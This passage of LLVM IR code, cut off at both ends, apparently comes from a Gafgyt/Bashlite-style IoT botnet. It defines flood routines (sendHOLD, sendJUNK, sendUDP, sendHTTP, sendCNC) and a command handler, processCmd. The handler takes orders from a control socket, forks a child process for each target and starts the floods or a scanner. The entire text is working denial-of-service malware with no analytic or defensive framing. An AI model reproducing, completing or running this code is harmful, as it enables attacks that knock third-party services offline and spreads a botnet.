  %46 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  store i32 %45, i32* %46, align 8
  %47 = call i32 (i32, i32, ...) @fcntl(i32 %45, i32 3, i8* null) #3
  %48 = or i32 %47, 2048
  %49 = call i32 (i32, i32, ...) @fcntl(i32 %45, i32 4, i32 %48) #3
  %50 = call i32 @connect(i32 %45, %struct.sockaddr* nonnull %33, i32 16) #3
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %56

; <label>:52:                                     ; preds = %44
  %53 = tail call i32* @__errno_location() #18
  %54 = load i32, i32* %53, align 4
  %55 = icmp eq i32 %54, 115
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52, %44
  %57 = load i32, i32* %46, align 8
  %58 = call i32 @close(i32 %57) #3
  br label %99

; <label>:59:                                     ; preds = %52
  store i8 1, i8* %42, align 4
  br label %99

; <label>:60:                                     ; preds = %.lr.ph
  %61 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %34) #3, !srcloc !7
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  %63 = load i32, i32* %62, align 8
  %64 = srem i32 %63, 64
  %65 = zext i32 %64 to i64
  %66 = shl i64 1, %65
  %67 = sdiv i32 %63, 64
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %68
  %70 = load i64, i64* %69, align 8
  %71 = or i64 %66, %70
  store i64 %71, i64* %69, align 8
  store i64 0, i64* %35, align 8
  store i64 10000, i64* %36, align 8
  %72 = load i32, i32* %62, align 8
  %73 = add nsw i32 %72, 1
  %74 = call i32 @select(i32 %73, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  switch i32 %74, label %99 [
    i32 1, label %75
    i32 -1, label %84
  ]

; <label>:75:                                     ; preds = %60
  store i32 4, i32* %7, align 4
  %76 = load i32, i32* %62, align 8
  %77 = call i32 @getsockopt(i32 %76, i32 1, i32 4, i8* nonnull %37, i32* nonnull %7) #3
  %78 = load i32, i32* %8, align 4
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %83, label %80

; <label>:80:                                     ; preds = %75
  %81 = load i32, i32* %62, align 8
  %82 = call i32 @close(i32 %81) #3
  br label %83

; <label>:83:                                     ; preds = %75, %80
  %.sink = phi i8 [ 0, %80 ], [ 2, %75 ]
  store i8 %.sink, i8* %42, align 4
  br label %99

; <label>:84:                                     ; preds = %60
  %85 = load i32, i32* %62, align 8
  %86 = call i32 @close(i32 %85) #3
  store i8 0, i8* %42, align 4
  br label %99

; <label>:87:                                     ; preds = %.lr.ph
  call void @makeRandomStr(i8* %27, i32 1024)
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %41, i64 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = call i64 @send(i32 %89, i8* %27, i64 1024, i32 16384) #3
  %91 = icmp eq i64 %90, -1
  br i1 %91, label %92, label %99

; <label>:92:                                     ; preds = %87
  %93 = tail call i32* @__errno_location() #18
  %94 = load i32, i32* %93, align 4
  %95 = icmp eq i32 %94, 11
  br i1 %95, label %99, label %96

; <label>:96:                                     ; preds = %92
  %97 = load i32, i32* %88, align 8
  %98 = call i32 @close(i32 %97) #3
  store i8 0, i8* %42, align 4
  br label %99

; <label>:99:                                     ; preds = %60, %92, %.lr.ph, %59, %56, %84, %83, %96, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %100 = icmp slt i64 %indvars.iv.next, %38
  br i1 %100, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %101

; <label>:101:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %110

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
  store i64 0, i64* %20, align 4
  %21 = zext i32 %10 to i64
  %22 = tail call i8* @llvm.stacksave()
  %23 = alloca %struct.state_t, i64 %21, align 16
  %24 = bitcast %struct.state_t* %23 to i8*
  %25 = sext i32 %10 to i64
  %26 = mul nsw i64 %25, 5
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 %26, i32 16, i1 false)
  %27 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %28 = add nsw i32 %27, %2
  %29 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %30 = icmp sgt i32 %28, %29
  br i1 %30, label %.preheader.lr.ph, label %._crit_edge

.preheader.lr.ph:                                 ; preds = %18
  %31 = icmp sgt i32 %9, 1
  %32 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %33 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %35 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %36 = bitcast i32* %8 to i8*
  %37 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %38 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  %40 = sext i32 %10 to i64
  br label %.preheader

.loopexit.loopexit:                               ; preds = %108
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %41 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %42 = icmp sgt i32 %28, %41
  br i1 %42, label %.preheader, label %._crit_edge.loopexit

.preheader:                                       ; preds = %.preheader.lr.ph, %.loopexit
  br i1 %31, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %108
  %indvars.iv = phi i64 [ %indvars.iv.next, %108 ], [ 0, %.lr.ph.preheader ]
  %43 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv
  %44 = getelementptr inbounds %struct.state_t, %struct.state_t* %23, i64 %indvars.iv, i32 1
  %45 = load i8, i8* %44, align 4
  switch i8 %45, label %108 [
    i8 0, label %46
    i8 1, label %62
    i8 2, label %89
  ]

; <label>:46:                                     ; preds = %.lr.ph
  %47 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %48 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  store i32 %47, i32* %48, align 8
  %49 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 3, i8* null) #3
  %50 = or i32 %49, 2048
  %51 = call i32 (i32, i32, ...) @fcntl(i32 %47, i32 4, i32 %50) #3
  %52 = call i32 @connect(i32 %47, %struct.sockaddr* nonnull %32, i32 16) #3
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %58

; <label>:54:                                     ; preds = %46
  %55 = tail call i32* @__errno_location() #18
  %56 = load i32, i32* %55, align 4
  %57 = icmp eq i32 %56, 115
  br i1 %57, label %61, label %58

; <label>:58:                                     ; preds = %54, %46
  %59 = load i32, i32* %48, align 8
  %60 = call i32 @close(i32 %59) #3
  br label %108

; <label>:61:                                     ; preds = %54
  store i8 1, i8* %44, align 4
  br label %108

; <label>:62:                                     ; preds = %.lr.ph
  %63 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %33) #3, !srcloc !8
  %64 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %65 = load i32, i32* %64, align 8
  %66 = srem i32 %65, 64
  %67 = zext i32 %66 to i64
  %68 = shl i64 1, %67
  %69 = sdiv i32 %65, 64
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %70
  %72 = load i64, i64* %71, align 8
  %73 = or i64 %68, %72
  store i64 %73, i64* %71, align 8
  store i64 0, i64* %34, align 8
  store i64 10000, i64* %35, align 8
  %74 = load i32, i32* %64, align 8
  %75 = add nsw i32 %74, 1
  %76 = call i32 @select(i32 %75, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  switch i32 %76, label %108 [
    i32 1, label %77
    i32 -1, label %86
  ]

; <label>:77:                                     ; preds = %62
  store i32 4, i32* %7, align 4
  %78 = load i32, i32* %64, align 8
  %79 = call i32 @getsockopt(i32 %78, i32 1, i32 4, i8* nonnull %36, i32* nonnull %7) #3
  %80 = load i32, i32* %8, align 4
  %81 = icmp eq i32 %80, 0
  br i1 %81, label %85, label %82

; <label>:82:                                     ; preds = %77
  %83 = load i32, i32* %64, align 8
  %84 = call i32 @close(i32 %83) #3
  br label %85

; <label>:85:                                     ; preds = %77, %82
  %.sink = phi i8 [ 0, %82 ], [ 2, %77 ]
  store i8 %.sink, i8* %44, align 4
  br label %108

; <label>:86:                                     ; preds = %62
  %87 = load i32, i32* %64, align 8
  %88 = call i32 @close(i32 %87) #3
  store i8 0, i8* %44, align 4
  br label %108

; <label>:89:                                     ; preds = %.lr.ph
  %90 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %37) #3, !srcloc !9
  %91 = getelementptr inbounds %struct.state_t, %struct.state_t* %43, i64 0, i32 0
  %92 = load i32, i32* %91, align 8
  %93 = srem i32 %92, 64
  %94 = zext i32 %93 to i64
  %95 = shl i64 1, %94
  %96 = sdiv i32 %92, 64
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %97
  %99 = load i64, i64* %98, align 8
  %100 = or i64 %95, %99
  store i64 %100, i64* %98, align 8
  store i64 0, i64* %38, align 8
  store i64 10000, i64* %39, align 8
  %101 = load i32, i32* %91, align 8
  %102 = add nsw i32 %101, 1
  %103 = call i32 @select(i32 %102, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %5, %struct.timeval* nonnull %6) #3
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %108, label %105

; <label>:105:                                    ; preds = %89
  %106 = load i32, i32* %91, align 8
  %107 = call i32 @close(i32 %106) #3
  store i8 0, i8* %44, align 4
  br label %108

; <label>:108:                                    ; preds = %62, %89, %.lr.ph, %61, %58, %86, %85, %105
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %109 = icmp slt i64 %indvars.iv.next, %40
  br i1 %109, label %.lr.ph, label %.loopexit.loopexit

._crit_edge.loopexit:                             ; preds = %.loopexit
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.stackrestore(i8* %22)
  br label %110

; <label>:110:                                    ; preds = %3, %._crit_edge
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %6, label %9

; <label>:6:                                      ; preds = %2
  %7 = load i32, i32* @mainCommSock, align 4
  %8 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %7, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.90, i64 0, i64 0))
  br label %354

; <label>:9:                                      ; preds = %2
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.91, i64 0, i64 0)) #15
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %17

; <label>:12:                                     ; preds = %9
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %15 = tail call i8* @inet_ntoa(i32 %14) #3
  %16 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %13, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.92, i64 0, i64 0), i8* %15)
  br label %354

; <label>:17:                                     ; preds = %9
  %18 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i64 0, i64 0)) #15
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %20, label %51

; <label>:20:                                     ; preds = %17
  %21 = icmp eq i32 %0, 2
  br i1 %21, label %25, label %22

; <label>:22:                                     ; preds = %20
  %23 = load i32, i32* @mainCommSock, align 4
  %24 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %23, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.94, i64 0, i64 0))
  br label %354

; <label>:25:                                     ; preds = %20
  %26 = getelementptr inbounds i8*, i8** %1, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = tail call i32 @strcmp(i8* %27, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.95, i64 0, i64 0)) #15
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %37

; <label>:30:                                     ; preds = %25
  %31 = load i32, i32* @scanPid, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %354, label %33

; <label>:33:                                     ; preds = %30
  %34 = tail call i32 @kill(i32 %31, i32 9) #3
  %35 = load i32, i32* @mainCommSock, align 4
  %36 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %35, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.96, i64 0, i64 0))
  store i32 0, i32* @scanPid, align 4
  br label %37

; <label>:37:                                     ; preds = %25, %33
  %38 = load i8*, i8** %26, align 8
  %39 = tail call i32 @strcmp(i8* %38, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.97, i64 0, i64 0)) #15
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* @scanPid, align 4
  %43 = icmp eq i32 %42, 0
  br i1 %43, label %44, label %354

; <label>:44:                                     ; preds = %41
  %45 = tail call i32 @fork() #3
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %48, label %47

; <label>:47:                                     ; preds = %44
  store i32 %45, i32* @scanPid, align 4
  br label %354

; <label>:48:                                     ; preds = %44
  %49 = load i32, i32* @mainCommSock, align 4
  %50 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %49, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.98, i64 0, i64 0))
  tail call void @StartTheLelz()
  unreachable

; <label>:51:                                     ; preds = %37, %17
  %52 = load i8*, i8** %1, align 8
  %53 = tail call i32 @strcmp(i8* %52, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i64 0, i64 0)) #15
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %55, label %.loopexit186

; <label>:55:                                     ; preds = %51
  %56 = icmp slt i32 %0, 4
  br i1 %56, label %354, label %57

; <label>:57:                                     ; preds = %55
  %58 = getelementptr inbounds i8*, i8** %1, i64 2
  %59 = load i8*, i8** %58, align 8
  %60 = tail call i32 @atoi(i8* %59) #15
  %61 = icmp slt i32 %60, 1
  br i1 %61, label %354, label %62

; <label>:62:                                     ; preds = %57
  %63 = getelementptr inbounds i8*, i8** %1, i64 3
  %64 = load i8*, i8** %63, align 8
  %65 = tail call i32 @atoi(i8* %64) #15
  %66 = icmp slt i32 %65, 1
  br i1 %66, label %354, label %67

; <label>:67:                                     ; preds = %62
  %68 = getelementptr inbounds i8*, i8** %1, i64 1
  %69 = load i8*, i8** %68, align 8
  %strchr = tail call i8* @strchr(i8* %69, i32 44)
  %70 = icmp eq i8* %strchr, null
  br i1 %70, label %77, label %.preheader185.preheader

.preheader185.preheader:                          ; preds = %67
  br label %.preheader185

.preheader185:                                    ; preds = %.preheader185.preheader, %73
  %.sink = phi i8* [ null, %73 ], [ %69, %.preheader185.preheader ]
  %71 = tail call i8* @strtok(i8* %.sink, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %72 = icmp eq i8* %71, null
  br i1 %72, label %.loopexit186.loopexit, label %73

; <label>:73:                                     ; preds = %.preheader185
  %74 = tail call i32 @listFork()
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %.preheader185

; <label>:76:                                     ; preds = %73
  tail call void @sendHOLD(i8* nonnull %71, i32 %60, i32 %65)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:77:                                     ; preds = %67
  %78 = tail call i32 @listFork()
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %354

; <label>:80:                                     ; preds = %77
  tail call void @sendHOLD(i8* %69, i32 %60, i32 %65)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit186.loopexit:                            ; preds = %.preheader185
  br label %.loopexit186

.loopexit186:                                     ; preds = %.loopexit186.loopexit, %51
  %81 = load i8*, i8** %1, align 8
  %82 = tail call i32 @strcmp(i8* %81, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.100, i64 0, i64 0)) #15
  %83 = icmp eq i32 %82, 0
  br i1 %83, label %84, label %.loopexit184

; <label>:84:                                     ; preds = %.loopexit186
  %85 = icmp slt i32 %0, 4
  br i1 %85, label %354, label %86

; <label>:86:                                     ; preds = %84
  %87 = getelementptr inbounds i8*, i8** %1, i64 2
  %88 = load i8*, i8** %87, align 8
  %89 = tail call i32 @atoi(i8* %88) #15
  %90 = icmp slt i32 %89, 1
  br i1 %90, label %354, label %91

; <label>:91:                                     ; preds = %86
  %92 = getelementptr inbounds i8*, i8** %1, i64 3
  %93 = load i8*, i8** %92, align 8
  %94 = tail call i32 @atoi(i8* %93) #15
  %95 = icmp slt i32 %94, 1
  br i1 %95, label %354, label %96

; <label>:96:                                     ; preds = %91
  %97 = getelementptr inbounds i8*, i8** %1, i64 1
  %98 = load i8*, i8** %97, align 8
  %strchr165 = tail call i8* @strchr(i8* %98, i32 44)
  %99 = icmp eq i8* %strchr165, null
  br i1 %99, label %108, label %.preheader183.preheader

.preheader183.preheader:                          ; preds = %96
  br label %.preheader183

.preheader183:                                    ; preds = %.preheader183.preheader, %102
  %.sink170 = phi i8* [ null, %102 ], [ %98, %.preheader183.preheader ]
  %100 = tail call i8* @strtok(i8* %.sink170, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %101 = icmp eq i8* %100, null
  br i1 %101, label %.loopexit184.loopexit, label %102

; <label>:102:                                    ; preds = %.preheader183
  %103 = tail call i32 @listFork()
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %.preheader183

; <label>:105:                                    ; preds = %102
  tail call void @sendJUNK(i8* nonnull %100, i32 %89, i32 %94)
  %106 = load i32, i32* @mainCommSock, align 4
  %107 = tail call i32 @close(i32 %106) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:108:                                    ; preds = %96
  %109 = tail call i32 @listFork()
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %354

; <label>:111:                                    ; preds = %108
  tail call void @sendJUNK(i8* %98, i32 %89, i32 %94)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit184.loopexit:                            ; preds = %.preheader183
  br label %.loopexit184

.loopexit184:                                     ; preds = %.loopexit184.loopexit, %.loopexit186
  %112 = load i8*, i8** %1, align 8
  %113 = tail call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i64 0, i64 0)) #15
  %114 = icmp eq i32 %113, 0
  br i1 %114, label %115, label %.loopexit182

; <label>:115:                                    ; preds = %.loopexit184
  %116 = icmp slt i32 %0, 6
  br i1 %116, label %354, label %117

; <label>:117:                                    ; preds = %115
  %118 = getelementptr inbounds i8*, i8** %1, i64 3
  %119 = load i8*, i8** %118, align 8
  %120 = tail call i32 @atoi(i8* %119) #15
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %354, label %122

; <label>:122:                                    ; preds = %117
  %123 = getelementptr inbounds i8*, i8** %1, i64 2
  %124 = load i8*, i8** %123, align 8
  %125 = tail call i32 @atoi(i8* %124) #15
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %354, label %127

; <label>:127:                                    ; preds = %122
  %128 = getelementptr inbounds i8*, i8** %1, i64 4
  %129 = load i8*, i8** %128, align 8
  %130 = tail call i32 @atoi(i8* %129) #15
  %131 = icmp eq i32 %130, -1
  %132 = icmp sgt i32 %130, 1024
  %or.cond = or i1 %131, %132
  br i1 %or.cond, label %354, label %133

; <label>:133:                                    ; preds = %127
  %134 = icmp eq i32 %0, 6
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %133
  %136 = getelementptr inbounds i8*, i8** %1, i64 5
  %137 = load i8*, i8** %136, align 8
  %138 = tail call i32 @atoi(i8* %137) #15
  %139 = icmp slt i32 %138, 1
  br i1 %139, label %354, label %140

; <label>:140:                                    ; preds = %135, %133
  %141 = getelementptr inbounds i8*, i8** %1, i64 1
  %142 = load i8*, i8** %141, align 8
  %143 = load i8*, i8** %123, align 8
  %144 = tail call i32 @atoi(i8* %143) #15
  %145 = load i8*, i8** %118, align 8
  %146 = tail call i32 @atoi(i8* %145) #15
  %147 = load i8*, i8** %128, align 8
  %148 = tail call i32 @atoi(i8* %147) #15
  br i1 %134, label %149, label %153

; <label>:149:                                    ; preds = %140
  %150 = getelementptr inbounds i8*, i8** %1, i64 5
  %151 = load i8*, i8** %150, align 8
  %152 = tail call i32 @atoi(i8* %151) #15
  br label %153

; <label>:153:                                    ; preds = %140, %149
  %154 = phi i32 [ %152, %149 ], [ 10, %140 ]
  %strchr166 = tail call i8* @strchr(i8* %142, i32 44)
  %155 = icmp eq i8* %strchr166, null
  br i1 %155, label %162, label %.preheader181.preheader

.preheader181.preheader:                          ; preds = %153
  br label %.preheader181

.preheader181:                                    ; preds = %.preheader181.preheader, %158
  %.sink171 = phi i8* [ null, %158 ], [ %142, %.preheader181.preheader ]
  %156 = tail call i8* @strtok(i8* %.sink171, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %157 = icmp eq i8* %156, null
  br i1 %157, label %.loopexit182.loopexit, label %158

; <label>:158:                                    ; preds = %.preheader181
  %159 = tail call i32 @listFork()
  %160 = icmp eq i32 %159, 0
  br i1 %160, label %161, label %.preheader181

; <label>:161:                                    ; preds = %158
  tail call void @sendUDP(i8* nonnull %156, i32 %144, i32 %146, i32 %148, i32 %154, i32 32)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:162:                                    ; preds = %153
  %163 = tail call i32 @listFork()
  %164 = icmp eq i32 %163, 0
  br i1 %164, label %165, label %354

; <label>:165:                                    ; preds = %162
  tail call void @sendUDP(i8* %142, i32 %144, i32 %146, i32 %148, i32 %154, i32 32)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit182.loopexit:                            ; preds = %.preheader181
  br label %.loopexit182

.loopexit182:                                     ; preds = %.loopexit182.loopexit, %.loopexit184
  %166 = load i8*, i8** %1, align 8
  %167 = tail call i32 @strcmp(i8* %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i64 0, i64 0)) #15
  %168 = icmp eq i32 %167, 0
  br i1 %168, label %169, label %199

; <label>:169:                                    ; preds = %.loopexit182
  %170 = icmp slt i32 %0, 6
  br i1 %170, label %354, label %171

; <label>:171:                                    ; preds = %169
  %172 = getelementptr inbounds i8*, i8** %1, i64 3
  %173 = load i8*, i8** %172, align 8
  %174 = tail call i32 @atoi(i8* %173) #15
  %175 = icmp slt i32 %174, 1
  br i1 %175, label %354, label %176

; <label>:176:                                    ; preds = %171
  %177 = getelementptr inbounds i8*, i8** %1, i64 5
  %178 = load i8*, i8** %177, align 8
  %179 = tail call i32 @atoi(i8* %178) #15
  %180 = icmp slt i32 %179, 1
  br i1 %180, label %354, label %181

; <label>:181:                                    ; preds = %176
  %182 = tail call i32 @listFork()
  %183 = icmp eq i32 %182, 0
  br i1 %183, label %184, label %354

; <label>:184:                                    ; preds = %181
  %185 = getelementptr inbounds i8*, i8** %1, i64 1
  %186 = load i8*, i8** %185, align 8
  %187 = getelementptr inbounds i8*, i8** %1, i64 2
  %188 = load i8*, i8** %187, align 8
  %189 = load i8*, i8** %172, align 8
  %190 = tail call i32 @atoi(i8* %189) #15
  %191 = trunc i32 %190 to i16
  %192 = getelementptr inbounds i8*, i8** %1, i64 4
  %193 = load i8*, i8** %192, align 8
  %194 = load i8*, i8** %177, align 8
  %195 = tail call i32 @atoi(i8* %194) #15
  %196 = getelementptr inbounds i8*, i8** %1, i64 6
  %197 = load i8*, i8** %196, align 8
  %198 = tail call i32 @atoi(i8* %197) #15
  tail call void @sendHTTP(i8* %186, i8* %188, i16 zeroext %191, i8* %193, i32 %195, i32 %198)
  tail call void @exit(i32 0) #17
  unreachable

; <label>:199:                                    ; preds = %.loopexit182
  %200 = tail call i32 @strcmp(i8* %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.103, i64 0, i64 0)) #15
  %201 = icmp eq i32 %200, 0
  br i1 %201, label %202, label %.loopexit180

; <label>:202:                                    ; preds = %199
  %203 = icmp slt i32 %0, 4
  br i1 %203, label %354, label %204

; <label>:204:                                    ; preds = %202
  %205 = getelementptr inbounds i8*, i8** %1, i64 2
  %206 = load i8*, i8** %205, align 8
  %207 = tail call i32 @atoi(i8* %206) #15
  %208 = icmp slt i32 %207, 1
  br i1 %208, label %354, label %209

; <label>:209:                                    ; preds = %204
  %210 = getelementptr inbounds i8*, i8** %1, i64 3
  %211 = load i8*, i8** %210, align 8
  %212 = tail call i32 @atoi(i8* %211) #15
  %213 = icmp slt i32 %212, 1
  br i1 %213, label %354, label %214

; <label>:214:                                    ; preds = %209
  %215 = getelementptr inbounds i8*, i8** %1, i64 1
  %216 = load i8*, i8** %215, align 8
  %strchr167 = tail call i8* @strchr(i8* %216, i32 44)
  %217 = icmp eq i8* %strchr167, null
  br i1 %217, label %226, label %.preheader179.preheader

.preheader179.preheader:                          ; preds = %214
  br label %.preheader179

.preheader179:                                    ; preds = %.preheader179.preheader, %220
  %.sink172 = phi i8* [ null, %220 ], [ %216, %.preheader179.preheader ]
  %218 = tail call i8* @strtok(i8* %.sink172, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %219 = icmp eq i8* %218, null
  br i1 %219, label %.loopexit180.loopexit, label %220

; <label>:220:                                    ; preds = %.preheader179
  %221 = tail call i32 @listFork()
  %222 = icmp eq i32 %221, 0
  br i1 %222, label %223, label %.preheader179

; <label>:223:                                    ; preds = %220
  tail call void @sendCNC(i8* nonnull %218, i32 %207, i32 %212)
  %224 = load i32, i32* @mainCommSock, align 4
  %225 = tail call i32 @close(i32 %224) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:226:                                    ; preds = %214
  %227 = tail call i32 @listFork()
  %228 = icmp eq i32 %227, 0
  br i1 %228, label %229, label %354

; <label>:229:                                    ; preds = %226
  tail call void @sendCNC(i8* %216, i32 %207, i32 %212)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit180.loopexit:                            ; preds = %.preheader179
  br label %.loopexit180

.loopexit180:                                     ; preds = %.loopexit180.loopexit, %199
  %230 = load i8*, i8** %1, align 8
  %231 = tail call i32 @strcmp(i8* %230, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i64 0, i64 0)) #15
  %232 = icmp eq i32 %231, 0
  br i1 %232, label %233, label %.loopexit178

; <label>:233:                                    ; preds = %.loopexit180
  %234 = icmp slt i32 %0, 4
  br i1 %234, label %354, label %235

; <label>:235:                                    ; preds = %233
  %236 = getelementptr inbounds i8*, i8** %1, i64 2
  %237 = load i8*, i8** %236, align 8
  %238 = tail call i32 @atoi(i8* %237) #15
  %239 = icmp slt i32 %238, 1
  br i1 %239, label %354, label %240

; <label>:240:                                    ; preds = %235
  %241 = getelementptr inbounds i8*, i8** %1, i64 3
  %242 = load i8*, i8** %241, align 8
  %243 = tail call i32 @atoi(i8* %242) #15
  %244 = icmp slt i32 %243, 1
  br i1 %244, label %354, label %245

; <label>:245:                                    ; preds = %240
